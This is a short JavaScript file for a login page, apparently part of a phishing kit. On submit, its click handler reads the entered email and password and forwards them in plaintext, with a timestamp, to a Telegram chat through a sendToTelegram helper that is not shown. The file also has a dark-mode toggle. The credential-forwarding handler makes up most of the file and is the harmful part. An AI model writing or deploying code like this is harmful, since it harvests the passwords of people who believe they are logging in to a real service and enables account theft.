const loginBtn = document.getElementById("loginBtn");
const darkToggle = document.getElementById("darkToggle");
const container = document.getElementById("container");

loginBtn.addEventListener("click", async () => {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Please fill both email and password!");
    return;
  }

  await sendToTelegram(`🔐 LOGIN\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`);
  alert("Login sent to Telegram!");
});

darkToggle.addEventListener("click", () => {
  container.classList.toggle("dark");
});
